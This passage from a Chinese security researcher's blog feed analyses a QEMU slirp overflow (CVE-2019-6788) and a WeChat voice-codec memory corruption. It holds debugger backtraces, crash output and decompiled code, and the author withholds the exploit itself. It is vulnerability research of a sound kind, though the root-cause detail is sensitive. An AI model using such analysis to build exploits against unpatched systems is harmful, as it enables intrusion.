  sb_wptr = 0x7fffd2d2a1c0 &quot;&quot;, 
  sb_rptr = 0x7fffd2d2a1c0 &quot;&quot;, 
  sb_data = 0x7fffd2d29cc0 'A' &amp;lt;repeats 200 times&amp;gt;...
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;利用过程不贴了&lt;/p&gt;

&lt;p&gt;我觉得最关键的不是上面这些分析，常规的分析到这里一般也就结束了，最多再放一个帅气的计算器&lt;/p&gt;

&lt;p&gt;但是我额外思考了一些东西：Debian在运行Poc的时候，通过与虚拟网卡交互发送数据到宿主机这个过程，内部的细节是怎样的？&lt;/p&gt;

&lt;p&gt;我昨晚到现在看了不少关于这部分的资料，各类资料都比较乱，这里简单列一下&lt;/p&gt;

&lt;p&gt;《QEMU虚拟网络E1000源代码分析》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://oenhan.com/qemu-virtual-network-e1000&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;《qemu网络虚拟化之数据流向分析一》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.cnblogs.com/ck1020/p/5910378.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;《qemu网络虚拟化之数据流向分析二》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.cnblogs.com/ck1020/p/5913906.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;《qemu网络虚拟化之数据流向分析三》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.cnblogs.com/ck1020/p/5914232.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;《虚拟网卡 TUN/TAP 驱动程序设计原理》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.ibm.com/developerworks/cn/linux/l-tuntap/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;《TUN/TAP设备浅析(一) – 原理浅析》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.jianshu.com/p/09f9375b7fa7&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这些资料有兴趣的同学可以看看，我也没有掌握的多深入，就不在这里瞎写了&lt;/p&gt;

&lt;p&gt;如同大佬所说，其安全性值得研究，对于我来说，在研究它的安全性之前，先多看看这些分析QEMU内部原理的文章理解流程&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/799491EBFE69F256E3A93A77788D5EA3.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;带着疑问，继续深入研究一下细节，以下的记录不一定对，大家酌情阅读，如果有大佬发现错误，还请不吝赐教&lt;/p&gt;

&lt;p&gt;在函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcp_emu()&lt;/code&gt;断下后，打印出整个调用栈&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pwndbg&amp;gt; bt
#0  tcp_emu (so=0x7fffd289e850, m=0x7fffd2527000) at /home/wnagzihxa1n/CVE-2019-6788/qemu/slirp/tcp_subr.c:612
#1  0x0000555555c10a2f in tcp_input (m=0x7fffd2527000, iphlen=20, inso=0x0, af=2) at /home/wnagzihxa1n/CVE-2019-6788/qemu/slirp/tcp_input.c:571
#2  0x0000555555c077e5 in ip_input (m=0x7fffd2527000) at /home/wnagzihxa1n/CVE-2019-6788/qemu/slirp/ip_input.c:206
#3  0x0000555555c0ac85 in slirp_input (slirp=0x55555682dfc0, pkt=0x7fffd4a7fcc0 &quot;RU\n&quot;, pkt_len=1334) at /home/wnagzihxa1n/CVE-2019-6788/qemu/slirp/slirp.c:876
#4  0x0000555555bf2f80 in net_slirp_receive (nc=0x555556829c70, buf=0x7fffd4a7fcc0 &quot;RU\n&quot;, size=1334) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/slirp.c:113
#5  0x0000555555be8a36 in nc_sendv_compat (nc=0x555556829c70, iov=0x7fffd547ef40, iovcnt=1, flags=0) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/net.c:706
#6  0x0000555555be8af8 in qemu_deliver_packet_iov (sender=0x555556829630, flags=0, iov=0x7fffd547ef40, iovcnt=1, opaque=0x555556829c70) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/net.c:734
#7  0x0000555555beb5d5 in qemu_net_queue_deliver_iov (queue=0x555556829e60, sender=0x555556829630, flags=0, iov=0x7fffd547ef40, iovcnt=1) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/queue.c:179
#8  0x0000555555beb744 in qemu_net_queue_send_iov (queue=0x555556829e60, sender=0x555556829630, flags=0, iov=0x7fffd547ef40, iovcnt=1, sent_cb=0x0) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/queue.c:224
#9  0x0000555555be8c3d in qemu_sendv_packet_async (sender=0x555556829630, iov=0x7fffd547ef40, iovcnt=1, sent_cb=0x0) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/net.c:775
#10 0x0000555555be8c6a in qemu_sendv_packet (nc=0x555556829630, iov=0x7fffd547ef40, iovcnt=1) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/net.c:783
#11 0x0000555555bec16b in net_hub_receive_iov (hub=0x555556829410, source_port=0x555556829990, iov=0x7fffd547ef40, iovcnt=1) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/hub.c:74
#12 0x0000555555bec365 in net_hub_port_receive_iov (nc=0x555556829990, iov=0x7fffd547ef40, iovcnt=1) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/hub.c:125
#13 0x0000555555be8add in qemu_deliver_packet_iov (sender=0x5555576ac360, flags=0, iov=0x7fffd547ef40, iovcnt=1, opaque=0x555556829990) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/net.c:732
#14 0x0000555555beb559 in qemu_net_queue_deliver (queue=0x555556829b30, sender=0x5555576ac360, flags=0, data=0x7fffd4a7fcc0 &quot;RU\n&quot;, size=1334) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/queue.c:164
#15 0x0000555555beb675 in qemu_net_queue_send (queue=0x555556829b30, sender=0x5555576ac360, flags=0, data=0x7fffd4a7fcc0 &quot;RU\n&quot;, size=1334, sent_cb=0x0) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/queue.c:19
#16 0x0000555555be889d in qemu_send_packet_async_with_flags (sender=0x5555576ac360, flags=0, buf=0x7fffd4a7fcc0 &quot;RU\n&quot;, size=1334, sent_cb=0x0) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/net.c:660
#17 0x0000555555be88d5 in qemu_send_packet_async (sender=0x5555576ac360, buf=0x7fffd4a7fcc0 &quot;RU\n&quot;, size=1334, sent_cb=0x0) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/net.c:667
#18 0x0000555555be8902 in qemu_send_packet (nc=0x5555576ac360, buf=0x7fffd4a7fcc0 &quot;RU\n&quot;, size=1334) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/net.c:673
#19 0x0000555555adf75f in e1000_send_packet (s=0x7fffd4a5d010, buf=0x7fffd4a7fcc0 &quot;RU\n&quot;, size=1334) at /home/wnagzihxa1n/CVE-2019-6788/qemu/hw/net/e1000.c:538
#20 0x0000555555adfbc9 in xmit_seg (s=0x7fffd4a5d010) at /home/wnagzihxa1n/CVE-2019-6788/qemu/hw/net/e1000.c:601
#21 0x0000555555ae00f8 in process_tx_desc (s=0x7fffd4a5d010, dp=0x7fffd547f180) at /home/wnagzihxa1n/CVE-2019-6788/qemu/hw/net/e1000.c:688
#22 0x0000555555ae02f0 in start_xmit (s=0x7fffd4a5d010) at /home/wnagzihxa1n/CVE-2019-6788/qemu/hw/net/e1000.c:743
#23 0x0000555555ae1388 in set_tctl (s=0x7fffd4a5d010, index=3590, val=26) at /home/wnagzihxa1n/CVE-2019-6788/qemu/hw/net/e1000.c:1111
#24 0x0000555555ae1505 in e1000_mmio_write (opaque=0x7fffd4a5d010, addr=14360, val=26, size=4) at /home/wnagzihxa1n/CVE-2019-6788/qemu/hw/net/e1000.c:1287
#25 0x0000555555860c39 in memory_region_write_accessor (mr=0x7fffd4a5f910, addr=14360, value=0x7fffd547f2e8, size=4, shift=0, mask=4294967295, attrs=...) at /home/wnagzihxa1n/CVE-2019-6788/qemu/memory.c:504
#26 0x0000555555860e4c in access_with_adjusted_size (addr=14360, value=0x7fffd547f2e8, size=4, access_size_min=4, access_size_max=4, access_fn=0x555555860b50 &amp;lt;memory_region_write_accessor&amp;gt;, mr=0x7fffd4a5f910
#27 0x0000555555863a9b in memory_region_dispatch_write (mr=0x7fffd4a5f910, addr=14360, data=26, size=4, attrs=...) at /home/wnagzihxa1n/CVE-2019-6788/qemu/memory.c:1452
#28 0x0000555555883fc0 in io_writex (env=0x55555684c6d0, iotlbentry=0x5555568563a0, mmu_idx=2, val=26, addr=18446649392234641432, retaddr=140736821593602, recheck=false, size=4) at /home/wnagzihxa1n/CVE-2015
#29 0x0000555555886016 in io_writel (env=0x55555684c6d0, mmu_idx=2, index=35, val=26, addr=18446649392234641432, retaddr=140736821593602, recheck=false) at /home/wnagzihxa1n/CVE-2019-6788/qemu/accel/tcg/sof3
#30 0x00005555558861d7 in helper_le_stl_mmu (env=0x55555684c6d0, addr=18446649392234641432, val=26, oi=34, retaddr=140736821593602) at /home/wnagzihxa1n/CVE-2019-6788/qemu/accel/tcg/softmmu_template.h:310
#31 0x00007fffd8420602 in code_gen_buffer ()
#32 0x00005555558a13f1 in cpu_tb_exec (cpu=0x555556844420, itb=0x7fffd841fb00 &amp;lt;code_gen_buffer+41540307&amp;gt;) at /home/wnagzihxa1n/CVE-2019-6788/qemu/accel/tcg/cpu-exec.c:171
#33 0x00005555558a22be in cpu_loop_exec_tb (cpu=0x555556844420, tb=0x7fffd841fb00 &amp;lt;code_gen_buffer+41540307&amp;gt;, last_tb=0x7fffd547fa18, tb_exit=0x7fffd547fa10) at /home/wnagzihxa1n/CVE-2019-6788/qemu/accel/tc5
#34 0x00005555558a25ba in cpu_exec (cpu=0x555556844420) at /home/wnagzihxa1n/CVE-2019-6788/qemu/accel/tcg/cpu-exec.c:725
#35 0x0000555555845fd2 in tcg_cpu_exec (cpu=0x555556844420) at /home/wnagzihxa1n/CVE-2019-6788/qemu/cpus.c:1429
#36 0x00005555558467ea in qemu_tcg_cpu_thread_fn (arg=0x555556844420) at /home/wnagzihxa1n/CVE-2019-6788/qemu/cpus.c:1733
#37 0x0000555555d7a1a2 in qemu_thread_start (args=0x555556866840) at /home/wnagzihxa1n/CVE-2019-6788/qemu/util/qemu-thread-posix.c:498
#38 0x00007ffff6ac46ba in start_thread (arg=0x7fffd5480700) at pthread_create.c:333
#39 0x00007ffff67fa41d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:109
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这个函数对应着&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;write()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static void
e1000_mmio_write(void *opaque, hwaddr addr, uint64_t val,
                 unsigned size)
{
    E1000State *s = opaque;
    unsigned int index = (addr &amp;amp; 0x1ffff) &amp;gt;&amp;gt; 2;

    if (index &amp;lt; NWRITEOPS &amp;amp;&amp;amp; macreg_writeops[index]) {
        if (!(mac_reg_access[index] &amp;amp; MAC_ACCESS_FLAG_NEEDED)
            || (s-&amp;gt;compat_flags &amp;amp; (mac_reg_access[index] &amp;gt;&amp;gt; 2))) {
            if (mac_reg_access[index] &amp;amp; MAC_ACCESS_PARTIAL) {
                DBGOUT(GENERAL, &quot;Writing to register at offset: 0x%08x. &quot;
                       &quot;It is not fully implemented.\n&quot;, index&amp;lt;&amp;lt;2);
            }
            macreg_writeops[index](s, index, val);
        } else {    /* &quot;flag needed&quot; bit is set, but the flag is not active */
            DBGOUT(MMIO, &quot;MMIO write attempt to disabled reg. addr=0x%08x\n&quot;,
                   index&amp;lt;&amp;lt;2);
        }
    } else if (index &amp;lt; NREADOPS &amp;amp;&amp;amp; macreg_readops[index]) {
        DBGOUT(MMIO, &quot;e1000_mmio_writel RO %x: 0x%04&quot;PRIx64&quot;\n&quot;,
               index&amp;lt;&amp;lt;2, val);
    } else {
        DBGOUT(UNKNOWN, &quot;MMIO unknown write addr=0x%08x,val=0x%08&quot;PRIx64&quot;\n&quot;,
               index&amp;lt;&amp;lt;2, val);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;e1000_mmio_write()&lt;/code&gt;会调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;set_tctl()&lt;/code&gt;，这里不是直接调用，而是通过数组转换的形式&lt;/p&gt;

&lt;p&gt;我个人的理解从函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;start_xmit()&lt;/code&gt;开始可以算作是我们分析的入口，找到了入口，而且参数数据我们可控，就可以进行初步的代码阅读工作了，函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pci_dma_read()&lt;/code&gt;用于获取我们传入的数据，保存在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;desc&lt;/code&gt;描述符里，函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;process_tx_desc()&lt;/code&gt;用于发送数据&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/D0924E2715C8F0696C9C3784DAE4F297.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我真怕自己变成大佬口中的这种人&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/75D5E758AB6EC06BBEB02FC9EA2D3CB7.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;下周开始找朱老师把ROOT给整了，一直拖拖拖，趁还没被优化赶紧薅一波技术大佬的羊毛，这两天继续搞搞分析，手上还有一大堆东西没学，把虫老板的逆向2重新翻了翻，又学到了很多，害，我还是太菜了&lt;/p&gt;

&lt;p&gt;明天开始就是清明节了，岛上见:)&lt;/p&gt;
</description>
                <pubDate>Sat, 04 Apr 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/04/04/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.04.04.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/04/04/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.04.04.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.04.02</title>
                <description>&lt;p&gt;通过拼命看文章从什么都没听过的菜鸟逐渐进化成了一只什么都略有耳闻的菜鸟&lt;/p&gt;

&lt;p&gt;从和别人聊一分钟就被发现是个弱鸡到现在可以扛五分钟都还可以继续接着忽悠，真不容易:(&lt;/p&gt;

&lt;p&gt;这两天狂补QEMU的知识点，感觉整个世界又清净了&lt;/p&gt;

&lt;p&gt;没弄完的微信先不说了&lt;/p&gt;

&lt;p&gt;把弄完的讲讲，主要是搭建QEMU环境这部分&lt;/p&gt;

&lt;p&gt;源码编译按照步骤一步步来，没有太多需要注意的，缺少的库&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apt-cache search&lt;/code&gt;搜一下&lt;/p&gt;

&lt;p&gt;创建文件系统和内核镜像也问题不大，就是比较花时间，我这就4k的网速&lt;/p&gt;

&lt;p&gt;因为我是MacOS上面运行VBox，VBox运行Ubuntu，Ubuntu运行QEMU，QEMU里面运行Debian，层层套娃，结果KVM开不起来，然后我就把QEMU启动命令里的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-enable-kvm&lt;/code&gt;删了，调试的话好像并没有明显的影响&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wnagzihxa1n@Qemu:~/CVE-2019-6788$ ./launch.sh
Could not access KVM kernel module: No such file or directory
qemu-system-x86_64: failed to initialize KVM: No such file or directory
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;至于传文件，我用的是Python自带的HTTP服务，直接QEMU里wget获取可执行文件即可&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -m SimpleHTTPServer
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;虚拟机使用的是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.0.2.15&lt;/code&gt;，宿主机是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.0.2.2&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;运行Poc崩溃，不过这只是崩溃，并不是真正的问题所在&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@ubuntu:~# ./crash_poc 

Thread 4 &quot;qemu-system-x86&quot; received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7fffd5480700 (LWP 2860)]
0x000055555580a496 in tb_tc_cmp (ap=0x7fffeeb80660 &amp;lt;code_gen_buffer+418375219&amp;gt;, bp=0x4141414141414141)
    at /home/wnagzihxa1n/CVE-2019-6788/qemu/tcg/tcg.c:341
341	    if (likely(a-&amp;gt;size &amp;amp;&amp;amp; b-&amp;gt;size)) {
(gdb) bt
#0  0x000055555580a496 in tb_tc_cmp (ap=0x7fffeeb80660 &amp;lt;code_gen_buffer+418375219&amp;gt;, bp=0x4141414141414141)
    at /home/wnagzihxa1n/CVE-2019-6788/qemu/tcg/tcg.c:341
#1  0x00007ffff7477347 in ?? () from /lib/x86_64-linux-gnu/libglib-2.0.so.0
#2  0x000055555580a70c in tcg_tb_insert (tb=0x7fffeeb80640 &amp;lt;code_gen_buffer+418375187&amp;gt;)
    at /home/wnagzihxa1n/CVE-2019-6788/qemu/tcg/tcg.c:399
#3  0x00005555558a563d in tb_gen_code (cpu=0x555556844420, pc=18446744071917395455, cs_base=0, flags=4244144, cflags=524288)
    at /home/wnagzihxa1n/CVE-2019-6788/qemu/accel/tcg/translate-all.c:1840
#4  0x00005555558a1bf8 in tb_find (cpu=0x555556844420, last_tb=0x7fffeeb000c0 &amp;lt;code_gen_buffer+417849491&amp;gt;, tb_exit=0, 
    cf_mask=524288) at /home/wnagzihxa1n/CVE-2019-6788/qemu/accel/tcg/cpu-exec.c:404
#5  0x00005555558a259e in cpu_exec (cpu=0x555556844420) at /home/wnagzihxa1n/CVE-2019-6788/qemu/accel/tcg/cpu-exec.c:724
#6  0x0000555555845fd2 in tcg_cpu_exec (cpu=0x555556844420) at /home/wnagzihxa1n/CVE-2019-6788/qemu/cpus.c:1429
#7  0x00005555558467ea in qemu_tcg_cpu_thread_fn (arg=0x555556844420) at /home/wnagzihxa1n/CVE-2019-6788/qemu/cpus.c:1733
#8  0x0000555555d7a1a2 in qemu_thread_start (args=0x555556866840)
    at /home/wnagzihxa1n/CVE-2019-6788/qemu/util/qemu-thread-posix.c:498
#9  0x00007ffff6ac46ba in start_thread (arg=0x7fffd5480700) at pthread_create.c:333
#10 0x00007ffff67fa41d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:109
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;具体漏洞其实就是其中一种情况导致没有加上写入的长度，这样一来数据写进去了，但是长度没加上，就可以一直写一直写，就溢出了，明天再把详细代码贴一下，再仔细的记录一下利用过程&lt;/p&gt;

&lt;p&gt;这两天看到个线上安全分享会议，看了议题挺想去听的，里面关于DevSecOps的实现，之前在泉哥公众号看到鹅厂在招人，其中就有开发DevSecOps的能力要求，我当时就想一定要学习一下这个方向的技术&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/87548A361C1375A2DEDA6734FB11456B.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;原文在这：《持续Fuzzing在DevSecOps中的应用》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/IzxaRuNKhxbycguXOsoeNw&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;但是报名的时候看到这个报名表，我心里一万只羊驼飞过，都什么年代了还搞这一套收集个人信息？&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/5CE4C05410E4B8AC639E31F16ED40FF8.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;算了，不听了&lt;/p&gt;

&lt;p&gt;看了一下数字最新的壳，有点意思，但我已经不玩了，投入产出比让人难受&lt;/p&gt;
</description>
                <pubDate>Thu, 02 Apr 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/04/02/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.04.02.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/04/02/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.04.02.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.03.31</title>
                <description>&lt;p&gt;菜栏现在的粉丝170位，拜托大家一件事，别点”好看”，是的，别点，这玩意对我有毒，我不想自己陷在多少个”好看”里面，也别去转发分享这个破菜栏的文章，说真的没啥好转发的，我又不靠这玩意赚钱，就是我日常学习瞎扯&lt;/p&gt;

&lt;p&gt;主要是我很喜欢说话，可以一直讲不停的那种，但是日常搞审计又没人跟我说话，所以开了个菜栏哇啦哇啦，现在这种状态我感觉挺好:)&lt;/p&gt;

&lt;p&gt;今天没做啥，继续分析微信那个内存破坏，菜啊，一个内存破坏分析了两天还没分析完&lt;/p&gt;

&lt;p&gt;做了一件很蠢的事情，C++的类函数在编译后第一个参数会是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;this&lt;/code&gt;，我一开始分析是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;this&lt;/code&gt;对应&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R0&lt;/code&gt;，但是分析一半脑子一抽，觉得&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;this&lt;/code&gt;不占用寄存器传参，又重新分析，后来发现一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;short&lt;/code&gt;类型变量对应成了指针，才发现不对&lt;/p&gt;

&lt;p&gt;我举个例子，就是一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;set/get&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class DemoCPlus {
private:
    int field;
public:
    DemoCPlus();
    int getField();
    void setField(int field);
};

DemoCPlus demoCPlus;
demoCPlus.setField(10);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看到第一个参数是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;this&lt;/code&gt;，占用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R0&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/D5689372426290773BFBF016567ADAD7.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;痛定思痛，这是低级错误啊！&lt;/p&gt;

&lt;p&gt;于是我赶紧复习看了一波ARM逆向，RE4B真是本好书，当然我看的是中文版，毕业那年买的书&lt;/p&gt;

&lt;h3 id=&quot;01-libvoipcodec---caudiojbminputaudioframetojbm&quot;&gt;01 libvoipCodec - CAudioJBM::InputAudioFrameToJBM&lt;/h3&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#01  pc 0x1219ff  /data/app/com.tencent.mm-TQNkaubz5b3G-b5myc_RkA==/lib/arm/libvoipCodec.so (CAudioJBM::InputAudioFrameToJBM(unsigned char*, int, unsigned int, unsigned short, int, int, int)+2298)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAudioJBM::InputAudioFrameToJBM()&lt;/code&gt;只对&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;n&lt;/code&gt;做了一个判断，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;n&lt;/code&gt;来自&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a3&lt;/code&gt;，也就是寄存器&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/71A1CFFFDAADA365C742FDB7D904BB16.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;崩溃的地方是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;memcpy()&lt;/code&gt;，由于我们目前还没有动态跑起来，中间的执行过程暂时不清楚，所以就不过多的去关注了，先把大概的流程梳理清楚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/FCD111DEC65630FFE311C7675DA7C340.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;02-libvoipcodec---xvechannelrecvrtppacketcng&quot;&gt;02 libvoipCodec - XVEChannel::RecvRtpPacketCng&lt;/h3&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#02  pc 0x10648b  /data/app/com.tencent.mm-TQNkaubz5b3G-b5myc_RkA==/lib/arm/libvoipCodec.so (XVEChannel::RecvRtpPacketCng(unsigned char*, short, int)+5690)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;感谢盘古分享的文章，让我可以直接拿重命名后的变量来分析，太省事了&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;RecvRtpPacketCng(__int64 XVEChannel, unsigned int *pData, __int16 len, void *a4)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XVEChannel::RecvRtpPacketCng()&lt;/code&gt;会对包做类型判断，再进行相应的分发操作&lt;/p&gt;

&lt;p&gt;我们需要关注两个位置&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/0074258F7776A64274468B12AFC978D3.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;第一个位置是函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnpacketRTP()&lt;/code&gt;，它负责减去&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;12&lt;/code&gt;字节&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;v7 = UnpacketRTP(
               &amp;amp;pCur,               // 指向包
               (signed int *)((char *)&amp;amp;nCodec + 3),
               udwTimeStamp,
               &amp;amp;udwTimeStamp[1],
               &amp;amp;redundantlen,
               &amp;amp;pDataLength);       // 对RTP包进行操作
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;传入的是指针变量，所以等于上层函数变量减去&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;12&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/987D119DE331317E7EE9EC25481B2745.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;回到函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XVEChannel::RecvRtpPacketCng()&lt;/code&gt;，减完之后的变量为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pDataLength&lt;/code&gt;，赋值给&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;___len&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;___len&lt;/code&gt;直接传入函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAudioJBM::InputAudioFrameToJBM()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/76933385D941A6569F54D941E470867C.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;后面的逻辑我们在一开始已经分析了，只判断了是否大于300&lt;/p&gt;

